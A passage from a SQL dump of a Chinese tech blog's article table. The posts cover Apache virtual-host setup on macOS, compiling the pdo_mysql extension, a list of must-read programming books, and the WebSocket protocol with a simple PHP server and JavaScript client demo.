list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;在终端运行&ldquo;&lt;code&gt;sudo vi/etc/apache2/httpd.conf&lt;/code&gt;&rdquo;，打开Apche的配置文件&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;在httpd.conf中找到&ldquo;&lt;code&gt;#Include/private/etc/apache2/extra/httpd-vhosts.conf&lt;/code&gt;&rdquo;，去掉前面的&ldquo;＃&rdquo;，保存并退出。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;运行&ldquo;sudo apachectl restart&rdquo;，重启Apache后就开启了它的虚拟主机配置功能。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;运行&ldquo;sudo vi/etc/apache2/extra/httpd-vhosts.conf&rdquo;，这样就打开了配置虚拟主机的文件httpd-vhost.conf，配置你需要的虚拟主机了。需要注意的是该文件默认开启了两个作为例子的虚拟主机：&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;&amp;lt;VirtualHost *:80&amp;gt;\r\n    ServerAdmin webmaster@dummy-host.example.com\r\n    DocumentRoot &quot;/usr/docs/dummy-host.example.com&quot;\r\n    ServerName dummy-host.example.com\r\n    ErrorLog &quot;/private/var/log/apache2/dummy-host.example.com-error_log&quot;\r\n    CustomLog &quot;/private/var/log/apache2/dummy-host.example.com-access_log&quot; common\r\n&amp;lt;/VirtualHost&amp;gt;\r\n&amp;lt;VirtualHost *:80&amp;gt;\r\n    ServerAdmin webmaster@dummy-host2.example.com\r\n    DocumentRoot &quot;/usr/docs/dummy-host2.example.com&quot;\r\n    ServerName dummy-host2.example.com\r\n    ErrorLog &quot;/private/var/log/apache2/dummy-host2.example.com-error_log&quot;\r\n    CustomLog &quot;/private/var/log/apache2/dummy-host2.example.com-access_log&quot; common\r\n&amp;lt;/VirtualHost&amp;gt;&lt;/pre&gt;&lt;p&gt;而实际上，这两个虚拟主机是不存在的，在没有配置任何其他虚拟主机时，可能会导致访问localhost时出现如下提示：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;ForbiddenYou don&amp;#39;t have permission to access /index.php on this server&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;最简单的办法就是在它们每行前面加上#，注释掉就好了，这样既能参考又不导致其他问题。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;增加如下配置&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;&amp;lt;VirtualHost *:80&amp;gt;\r\n    DocumentRoot &quot;/Users/[用户名]/Sites&quot;\r\n    ServerName sites\r\n    ErrorLog &quot;/private/var/log/apache2/sites-error_log&quot;\r\n    CustomLog &quot;/private/var/log/apache2/sites-access_log&quot; common\r\n&amp;lt;/VirtualHost&amp;gt;&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;保存退出，并重启Apache&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;运行&ldquo;&lt;code&gt;sudo vi/etc/hosts&lt;/code&gt;&rdquo;，打开hosts配置文件，加入&rdquo;&lt;code&gt;127.0.0.1sites&lt;/code&gt;&ldquo;，这样就可以配置完成sites虚拟主机了，这样就可以用&ldquo;http://sites&rdquo;访问了，其内容和&ldquo;http://localhost/~[用户名]&rdquo;完全一致。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386212492),
(13, 13, '&lt;p style=&quot;text-indent:2em;&quot;&gt;MACOSlion系统的php运行环境在上一篇文章已经介绍了，这一篇是关于为php配置支持pdo_mysql扩展库的，zend官方已经不建议使用mysql直连函数来操作mysql数据库，所以在以后的程序中，我们开始换用pdo以及mysqli，pdo是什么我想大家都很清楚了，这里我们不再说明，下面开始具体的安装过程：&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;wbr&gt;首先打开终端，cd命令进入php的源码包里，进入到ext/pdo_mysql目录&lt;br /&gt;由于我的php的ext包在/usr/include/php目录下，php-config以及phpize在/usr/bin目录下，所以下面我会用到这些目录，你可以改成你自己本地的对应的目录，具体的过程是：&lt;/wbr&gt;&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;cd/usr/include/php/ext/pdo_mysql\r\n/usr/bin/phpize\r\n./configure --with-php-config=/usr/bin/php-config --with-pdo-mysql=/usr/local/mysql(mysql的安装目录)\r\nmake\r\nmakeinstall&lt;/pre&gt;&lt;p&gt;然后在你的php的扩展目录里会生成一个pdo_mysql.so的扩展包&lt;br /&gt;&lt;/p&gt;&lt;div id=&quot;sina_keyword_ad_area2&quot; class=&quot;articalContent  &quot;&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;最后修改php.ini，加入扩展语句：&lt;br /&gt;extension=/usr/lib/php/extensions/no-debug-non-zts-20090626/pdo_mysql.so&lt;br /&gt;然后sudoapachectl restart，重启apache，你的pdo_mysql扩展库就可以正常使用了&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/div&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386292952),
(14, 14, '&lt;div id=&quot;sina_keyword_ad_area2&quot; class=&quot;articalContent  &quot;&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;国外知名网站stackoverflow上有一个问题调查： 哪本书是对&lt;strong&gt;程序员&lt;/strong&gt;最有影响、每个程序员都该阅读的书？&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;这个调查已历时两年，目前为止吸引了&lt;strong&gt;153,432&lt;/strong&gt;人访问，读者共推荐出了478本书(还在增加)，其中最火的一本书《&lt;strong&gt;Code Complete&lt;/strong&gt;》被顶了1306次。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;如果你是个&lt;strong&gt;程序猿&lt;/strong&gt;，你一定有兴 趣看看这些书里你都看过几本，如果你一本没看过的话，我也不好说什么，也许你是个天才，但我相信大多数人都知道，你在学校里根本学不到什 么真正的工作中需要的知识，我们毕业后能帮助我们在公司中胜任工作的老师就是这些优秀的书籍，一本好书可以改变一个人的一生。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;wbr&gt;&lt;/wbr&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;下面是这个调查中排名靠前的书的一个简单的清单：&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;第一名：1306票《Code Complete (2nd Ed) by SteveMcConnell》，中文版《代码大全（第二版）》,两届Software Jolt Award震撼大奖得主！&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;第二名：1161票 《The Pragmatic Programmer》，中文版《程序员修炼之道》&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;第三名：689票 《Structure and Interpretation of ComputerPrograms》，中文版《计算机程序的构造和解释》&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;第四名：557票 《The C Programming Language》，中文版《C程序设计语言》&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;第五名：472票 《Refactoring: Improving the Design of ExistingCode》，中文版《重构：改善既有代码的设计》&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;第六名：472票 《Introduction to algorithms》，中文版《算法导论》&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;第七名：430票 《The Mythical Man-Month》，中文版《人月神话》&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;第八名：426票 《Design Patterns》，中文版《设计模式》&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;第九名：386票 《The Art of Computer Programming(First VolumeHardcover)》，中文版《计算机程序设计艺术第 （第一卷）》&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;第10名：353票 《Compilers: Principles, Techniques, and Tools》，中文版《编译原理》&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;第11名：329票 《Head-First Design Patterns》，中文版《Head First 设计模式》&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;也许，这里的排名并不具有什么权威性，但绝对可以说都是好书！&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;这11本外还有很多书虽然票数不是那么多，但大家估计都耳熟能详，比如《Effective C++》(中文版《EffectiveC++：改善程序与设计的55个具体做法》)，《Clean Code》(中文版《代码整洁之道》)，《EffectiveJava》(中文版《Effective Java中文版(第2版)》等 。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;记得有位先哲曾说过：&lt;/p&gt;&lt;blockquote&gt;&lt;p style=&quot;color:#ff0000&quot;&gt;一种&lt;strong&gt;编程语言&lt;/strong&gt;的重要性并不在于语言本身，而是在于这种语言所体现出来的编程思维模式。所以说，并不是你用到的书才去读，读书是一种习惯。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;原文地址：&lt;a style=&quot;color:#c00000;text-decoration:underline;&quot; href=&quot;http://www.oschina.net/news/17625/books-every-programmer-should-read&quot; target=&quot;_blank&quot;&gt;&lt;span style=&quot;color:#c00000;&quot;&gt;每个程序员都该阅读的书&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;/div&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386302362),
(15, 15, '&lt;h3 style=&quot;text-indent:2em;&quot;&gt;&lt;strong&gt;首先认识HTML5的websocket：&lt;/strong&gt;&lt;/h3&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;在HTML5规范中，我最喜欢的Web技术就是正迅速变得流行的WebSocket API。WebSocket提供了一个受欢迎的技术，以替代我们过去几年一直在用的Ajax技术。这个新的API提供了一个方法，从客户端使用简单的语法有效地推动消息到服务器。让我们看一看HTML5的WebSocket API：它可用于客户端、服务器端。而且有一个优秀的第三方API，名为Socket.IO。&lt;br /&gt;&lt;/p&gt;&lt;h4 style=&quot;text-indent:2em;&quot;&gt;&lt;a name=&quot;t1&quot;&gt;&lt;/a&gt;&lt;strong&gt;什么是WebSocket API?&lt;/strong&gt;&lt;/h4&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;WebSocket API是下一代客户端-服务器的异步通信方法。该通信取代了单个的TCP套接字，使用ws或wss协议，可用于任意的客户端和服务器程序。WebSocket目前由W3C进行标准化。WebSocket已经受到Firefox 4、Chrome 4、Opera 10.70以及Safari 5等浏览器的支持。&lt;br /&gt;&lt;br /&gt;WebSocket API最伟大之处在于服务器和客户端可以在给定的时间范围内的任意时刻，相互推送信息。WebSocket并不限于以Ajax(或XHR)方式通信，因为Ajax技术需要客户端发起请求，而WebSocket服务器和客户端可以彼此相互推送信息；XHR受到域的限制，而WebSocket允许跨域通信。&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;Ajax技术很聪明的一点是没有设计要使用的方式。WebSocket为指定目标创建，用于双向推送消息。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;关于web实时通信技术的发展(poll,ajax,comet等)以及websocket的介绍具体请参见：&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://www.ibm.com/developerworks/cn/web/1112_huangxa_websocket/&quot;&gt;使用 HTML5 WebSocket 构建实时 Web 应用&lt;/a&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;链接的文章介绍了websocket的旧版协议草案，并用.net实现了该草案。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;在2011年7月份，websocket发布了最新版的协议草案，草案的最新版本是草案10,草案的链接地址为：&lt;a href=&quot;http://tools.ietf.org/html/draft-ietf-hybi-thewebsocketprotocol-10&quot; target=&quot;_blank&quot;&gt;http://tools.ietf.org/html/draft-ietf-hybi-thewebsocketprotocol-10&lt;/a&gt;，新的草案增加了安全性和可扩展性。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;新草案客户端与服务器端的握手协议：&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;客户端发起websocket请求&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:js;toolbar:false;&quot;&gt;socket = new MozWebSocket(&quot;ws://localhost:12345/websocket/server.php&quot;)&lt;/pre&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;这里用的是firefox浏览器，所以用MozWebSocket()，其他浏览器像chrome，需要用WebSocket()&lt;/span&gt;&lt;/span&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;请求头信息格式：&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:plain;toolbar:false;&quot;&gt;GET /chat HTTP/1.1 \r\nHost: localhost:12345 \r\nUpgrade: websocket \r\nConnection: Upgrade \r\nSec-WebSocket-Key: kHuChwCCkr9PZDPWo+nMXg== \r\nSec-WebSocket-Origin: http://localhost \r\nSec-WebSocket-Protocol: websocket \r\nSec-WebSocket-Version: 8&lt;/pre&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;服务器端取得请求信息，主要是Sec-WebSocket-Key的值，取得该值之后，连接上字符串258EAFA5-E914-47DA-95CA-C5AB0DC85B11，然后计算其sha1散列值，生成一个20位的字符串，再对该字符串进行base64编码，最后得到的值，按照下列响应信息格式返回给客户端&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;pre class=&quot;brush:plain;toolbar:false;&quot;&gt;HTTP/1.1 101 Switching Protocols \r\nUpgrade: websocket \r\nConnection: Upgrade \r\nSec-WebSocket-Accept: 0VXXdxNQxqV7u7vtIhrxqdYUgRA= \r\nSec-WebSocket-Protocol: websocket&lt;/pre&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;客户端接收到服务器的响应信息，连接建立。&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;新草案的数据传输格式请参考下文：&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;以下部分转自：&lt;/span&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://blog.csdn.net/fenglibing/article/details/6852497&quot;&gt;基于Websocket草案10协议的升级及基于Netty的握手实现&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;strong&gt;2、数据传输的格式：&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;以下是一个格式标准图：&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;img src=&quot;/uploads/Image/201312/06/1386302637_3nnare_7411_0_1318059860m8L6.gif.png&quot; title=&quot;0_1318059860m8L6.gif.png&quot; /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;strong&gt;FIN：&lt;/strong&gt;1位，用来表明这是一个消息的最后的消息片断，当然第一个消息片断也可能是最后的一个消息片断；&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;strong&gt;RSV1, RSV2, RSV3:&lt;/strong&gt; 分别都是1位，如果双方之间没有约定自定义协议，那么这几位的值都必须为0,否则必须断掉WebSocket连接；&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;strong&gt;Opcode:&lt;/strong&gt;4位操作码，定义有效负载数据，如果收到了一个未知的操作码，连接也必须断掉，以下是定义的操作码：&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;* &amp;nbsp;%x0 表示连续消息片断&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;* &amp;nbsp;%x1 表示文本消息片断&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;* &amp;nbsp;%x2 表未二进制消息片断&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;* &amp;nbsp;%x3-7 为将来的非控制消息片断保留的操作码&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;* &amp;nbsp;%x8 表示连接关闭&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;* &amp;nbsp;%x9 表示心跳检查的ping&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;* &amp;nbsp;%xA 表示心跳检查的pong&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;* &amp;nbsp;%xB-F 为将来的控制消息片断的保留操作码&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;strong&gt;Mask:&lt;/strong&gt;1位，定义传输的数据是否有加掩码,如果设置为1,掩码键必须放在masking-key区域，客户端发送给服务端的所有消息，此位的值都是1；&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;strong&gt;Payload length: &lt;/strong&gt;传输数据的长度，以字节的形式表示：7位、7+16位、或者7+64位。如果这个值以字节表示是0-125这个范围，那这个值就表示传输数据的长度；如果这个值是126，则随后的两个字节表示的是一个16进制无符号数，用来表示传输数据的长度；如果这个值是127,则随后的是8个字节表示的一个64位无符合数，这个数用来表示传输数据的长度。多字节长度的数量是以网络字节的顺序表示。负载数据的长度为扩展数据及应用数据之和，扩展数据的长度可能为0,因而此时负载数据的长度就为应用数据的长度。&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;strong&gt;Masking-key:&lt;/strong&gt;0或4个字节，客户端发送给服务端的数据，都是通过内嵌的一个32位值作为掩码的；掩码键只有在掩码位设置为1的时候存在。&lt;br /&gt;&lt;strong&gt;Payload data: &lt;/strong&gt; (x+y)位，负载数据为扩展数据及应用数据长度之和。&lt;br /&gt;&lt;strong&gt;Extension data:&lt;/strong&gt;x位，如果客户端与服务端之间没有特殊约定，那么扩展数据的长度始终为0，任何的扩展都必须指定扩展数据的长度，或者长度的计算方式，以及在握手时如何确定正确的握手方式。如果存在扩展数据，则扩展数据就会包括在负载数据的长度之内。&lt;br /&gt;&lt;strong&gt;Application data:&lt;/strong&gt;y位，任意的应用数据，放在扩展数据之后，应用数据的长度=负载数据的长度-扩展数据的长度。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;数据帧协议是按照扩展的巴科斯范式（ANBF：Augmented Backus-Naur Form &lt;a href=&quot;http://tools.ietf.org/html/rfc5234&quot; target=&quot;_blank&quot;&gt;RFC5234&lt;/a&gt;）组成的: &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/p&gt;&lt;pre class=&quot;brush:plain;toolbar:false;&quot;&gt;ws-frame                = frame-fin   \r\n                          frame-rsv1   \r\n                          frame-rsv2   \r\n                          frame-rsv3   \r\n                          frame-opcode   \r\n                          frame-masked   \r\n                          frame-payload-length   \r\n                          [ frame-masking-key ]   \r\n                          frame-payload-data   \r\n                               \r\nframe-fin               = %x0 ; 表示这不是当前消息的最后一帧，后面还有消息   \r\n                        / %x1 ; 表示这是当前消息的最后一帧   \r\n                               \r\nframe-rsv1              = %x0   \r\n                          ; 1 bit, 如果没有扩展约定，该值必须为0   \r\n                               \r\nframe-rsv2              = %x0   \r\n                          ; 1 bit, 如果没有扩展约定，该值必须为0   \r\n                               \r\nframe-rsv3              = %x0   \r\n                          ; 1 bit, 如果没有扩展约定，该值必须为0   \r\n                               \r\nframe-opcode            = %x0 ; 表示这是一个连续帧消息   \r\n                        / %x1 ; 表示文本消息   \r\n                        / %x2 ; 表示二进制消息   \r\n                        / %x3-7 ; 保留   \r\n                        / %x8 ; 表示客户端发起的关闭   \r\n                        / %x9 ; ping（用于心跳）   \r\n                        / %xA ; pong（用于心跳）   \r\n                        / %xB-F ; 保留   \r\n                               \r\nframe-masked            = %x0 ; 数据帧没有加掩码，后面没有掩码key   \r\n                        / %x1 ; 数据帧加了掩码，后面有掩码key   \r\n                               \r\nframe-payload-length    = %x00-7D   \r\n                        / %x7E frame-payload-length-16   \r\n                        / %x7F frame-payload-length-63   \r\n   ; 表示数据帧的长度   \r\n                               \r\nframe-payload-length-16 = %x0000-FFFF   \r\n   ; 表示数据帧的长度   \r\n                               \r\nframe-payload-length-63 = %x0000000000000000-7FFFFFFFFFFFFFFF   \r\n   ; 表示数据帧的长度   \r\n                               \r\nframe-masking-key       = 4( %0x00-FF ) ; 掩码key，只有当掩码位为1时出现   \r\n                               \r\nframe-payload-data      = (frame-masked-extension-data   \r\n                           frame-masked-application-data)   ; 当掩码位为1时，这里的数据为带掩码的数据，扩展数据及应用数据都带掩码   \r\n                        / (frame-unmasked-extension-data   \r\n                           frame-unmasked-application-data) ; 当掩码位为0时，这里的数据为不带掩码的数据，扩展数据及应用数据都不带掩码   \r\n                               \r\nframe-masked-extension-data     = *( %x00-FF ) ; 目前保留，以后定义   \r\n                               \r\nframe-masked-application-data   = *( %x00-FF )   \r\n                               \r\nframe-unmasked-extension-data   = *( %x00-FF ) ; 目前保留，以后定义   \r\n                               \r\nframe-unmasked-application-data = *( %x00-FF )&lt;/pre&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;：转载结束&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;上面是websocket的简单介绍，以作备忘。&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;参考文章：&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;草案10：&lt;a title=&quot;http://tools.ietf.org/html/draft-ietf-hybi-thewebsocketprotocol-10#section-4.2&quot; target=&quot;_blank&quot; href=&quot;http://tools.ietf.org/html/draft-ietf-hybi-thewebsocketprotocol-10#section-4.2&quot;&gt;http://tools.ietf.org/html/draft-ietf-hybi-thewebsocketprotocol-10#section-4.2&lt;/a&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;数据传输协议解析：&lt;a title=&quot;http://blog.csdn.net/fenglibing/article/details/6852497&quot; target=&quot;_blank&quot; href=&quot;http://blog.csdn.net/fenglibing/article/details/6852497&quot;&gt;http://blog.csdn.net/fenglibing/article/details/6852497&lt;/a&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;认识HTML5的websocket：&lt;a title=&quot;http://www.cnblogs.com/wei2yi/archive/2011/03/23/1992830.html&quot; target=&quot;_blank&quot; href=&quot;http://www.cnblogs.com/wei2yi/archive/2011/03/23/1992830.html&quot;&gt;http://www.cnblogs.com/wei2yi/archive/2011/03/23/1992830.html&lt;/a&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;br /&gt;&lt;/p&gt;', 1386302771);
INSERT INTO `la_article` (`id`, `archiveid`, `content`, `updatetime`) VALUES
(16, 16, '&lt;p style=&quot;text-indent:2em;&quot;&gt;前一篇： &lt;a target=&quot;_blank&quot; href=&quot;http://blog.csdn.net/luochuan/article/details/7198619&quot;&gt;websocket基础知识介绍&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;关于websocket，网上搜索到的实现代码很多，但是用PHP做socket服务器的资料比较少，根据搜索到的资料以及自己的研究，记下此文。&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;websocket客户端的具体实现代码以及服务器(PHP)端代码介绍，本文的代码只是一个小的demo，实现简单的通信，客户端发送一个字符串，服务器端接收到字符串并响应给客户端浏览器（firefox），支持中文字符串通信，客户端响应正常&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;首先分析客户端代码，根据websocket的介绍，我们需要用MozWebSocket(host)来向服务器发送连接请求，然后为建立的socket绑定事件，socket的方法：&lt;/p&gt;&lt;p style=&quot;background-color:#ffffff;text-indent:2em;&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;onopen：socket连接建立成功时触发的事件&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;background-color:#ffffff;text-indent:2em;&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;onmessage：客户端接收到服务器端返回的信息时触发的事件&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;background-color:#ffffff;text-indent:2em;&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;onerror：建立连接出错时触发的事件&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;background-color:#ffffff;text-indent:2em;&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;onclose：断开连接时触发的事件&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;background-color:#ffffff;text-indent:2em;&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;&lt;span style=&quot;color:#000000&quot;&gt;client.html代码：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:js;toolbar:false;&quot;&gt;&amp;lt;script&amp;gt;\r\nvar socket;\r\n                                                                            \r\n/**\r\n * 初始化请求服务器端以建立websocket连接，host为本地localhost,请求的端口号为12345\r\n * 之后为socket的各事件绑定事件内容\r\n */\r\nfunction init(){\r\n    var host = &quot;ws://localhost:12345/websocket/server.php&quot;;\r\n    try{\r\n        socket = new MozWebSocket(host);\r\n        log(&#039;WebSocket - status &#039;+socket.readyState);\r\n        socket.onopen    = function(msg){ log(&quot;Welcome - status &quot;+this.readyState); };\r\n        socket.onmessage = function(msg){ log(&quot;Received: &quot;+msg.data); };\r\n        socket.onclose   = function(msg){ log(&quot;Disconnected - status &quot;+this.readyState); };\r\n    } catch(ex) {\r\n        log(ex);\r\n    }\r\n}\r\n                                                                            \r\n/**\r\n * send方法发送消息到服务器端\r\n */\r\nfunction send(){\r\n    var msg = $(&quot;msg&quot;).value;\r\n    if (!msg) return false;\r\n                                                                                \r\n    $(&quot;msg&quot;).value=&quot;&quot;;\r\n    try{\r\n        socket.send(msg);\r\n        log(&#039;Sent: &#039;+msg);\r\n    } catch(ex) {\r\n        log(ex);\r\n    }\r\n}\r\n                                                                            \r\n//初始化的其他方法\r\nfunction $(id) {\r\n    return document.getElementById(id);\r\n}\r\nfunction log(msg) {\r\n    $(&quot;log&quot;).innerHTML+=&quot;&amp;lt;br&amp;gt;&quot;+msg;\r\n}\r\nfunction onkey(event){\r\n    if (event.keyCode == 13) send();\r\n}\r\n&amp;lt;/script&amp;gt;&lt;/pre&gt;&lt;pre class=&quot;brush:html;toolbar:false;&quot;&gt;&amp;lt;body onload=&quot;init()&quot;&amp;gt;\r\n &amp;lt;h3&amp;gt;WebSocket v2.00&amp;lt;/h3&amp;gt;\r\n &amp;lt;div id=&quot;log&quot;&amp;gt;&amp;lt;/div&amp;gt;\r\n &amp;lt;input id=&quot;msg&quot; type=&quot;textbox&quot; onkeypress=&quot;onkey(event)&quot;/&amp;gt;\r\n &amp;lt;button onclick=&quot;send()&quot;&amp;gt;Send&amp;lt;/button&amp;gt;\r\n&amp;lt;/body&amp;gt;&lt;/pre&gt;&lt;p style=&quot;background-color:#ffffff;text-indent:2em;&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;&lt;span style=&quot;color:#000000&quot;&gt;其次是服务器端分析，这里用PHP建立服务器端的socket服务器，虽然PHP不支持多线程，但这里只是个人的学习demo，重要的是通信成功，上篇文章介绍了要握手成功需要响应给客户端的信息格式，这里不做介绍。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;background-color:#ffffff;text-indent:2em;&quot;&gt;首先用socket_create等方法建立一个socket服务器，端口号即前面客户端请求的端口12345，代码 如下：&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;$master  = WebSocket(&quot;localhost&quot;,12345);\r\n$sockets[] = $master;\r\nfunction WebSocket($address,$port) {\r\n    $master=socket_create(AF_INET, SOCK_STREAM, SOL_TCP)     or die(&quot;socket_create() failed&quot;);\r\n    socket_set_option($master, SOL_SOCKET, SO_REUSEADDR, 1)  or die(&quot;socket_option() failed&quot;);\r\n    socket_bind($master, $address, $port)                    or die(&quot;socket_bind() failed&quot;);\r\n    socket_listen($master,20)                                or die(&quot;socket_listen() failed&quot;);\r\n    echo &quot;Server Started : &quot;.date(&#039;Y-m-d H:i:s&#039;).&quot;&quot;;\r\n    echo &quot;Master socket  : &quot;.$master.&quot;&quot;;\r\n    echo &quot;Listening on   : &quot;.$address.&quot; port &quot;.$port.&quot;&quot;;\r\n    return $master;\r\n}&lt;/pre&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;服务器建立成功之后，如果有客户端请求连接本服务器，需要用socket_accept等方法建立一个新的socket连接，并接收客户端的请求信息，处理之后，返回响应信息，然后握手成功。&lt;/p&gt;&lt;p 